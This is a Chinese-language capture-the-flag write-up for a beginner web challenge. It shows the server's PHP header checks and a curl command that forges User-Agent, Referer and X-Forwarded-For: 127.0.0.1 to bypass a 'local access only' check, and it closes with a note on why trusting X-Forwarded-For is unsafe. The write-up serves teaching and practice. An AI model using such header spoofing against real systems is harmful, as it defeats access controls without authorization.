# week1wh1sper's_secret_garden

## 题目简述

服务端依次检查三个 HTTP 请求头：`User-Agent` 中要包含 `wh1sper`，`Referer` 中要包含 `ctf.njupt.edu.cn`，`X-Forwarded-For` 中要包含 `127.0.0.1`。三个正则条件同时满足后才输出 flag。

官方源码的判断等价于：

```php
preg_match('/wh1sper/i', $_SERVER['HTTP_USER_AGENT'])
preg_match('/ctf\.njupt\.edu\.cn/i', $_SERVER['HTTP_REFERER'])
preg_match('/127\.0\.0\.1/i', $_SERVER['HTTP_X_FORWARDED_FOR'])
```

## 解题过程

浏览器地址栏只能方便地控制 URL，不能直接设置所有请求头，因此使用 Burp Suite、curl 等工具重放请求。构造如下头部即可：

```text
User-Agent: wh1sper
Referer: https://ctf.njupt.edu.cn/
X-Forwarded-For: 127.0.0.1
```

对应的 curl 请求为：

```bash
curl -s 'http://<HOST>:<PORT>/' \
  -H 'User-Agent: wh1sper' \
  -H 'Referer: https://ctf.njupt.edu.cn/' \
  -H 'X-Forwarded-For: 127.0.0.1'
```

`User-Agent` 描述客户端，`Referer` 表示请求来源页面，`X-Forwarded-For` 通常由可信反向代理记录原始客户端 IP。此题直接信任用户可控的 `X-Forwarded-For`，所以伪造该请求头即可绕过“本地访问”判断；真实系统不应在未经过可信代理清洗时依赖它做鉴权。

## 方法总结

- 核心技巧：根据服务端读取的 `HTTP_*` 变量伪造对应请求头。
- 识别信号：源码检查 `HTTP_USER_AGENT`、`HTTP_REFERER` 或 `HTTP_X_FORWARDED_FOR`。
- 复用要点：区分客户端可控头与代理生成头；只要应用直接信任前者，基于来源的限制就可能被绕过。
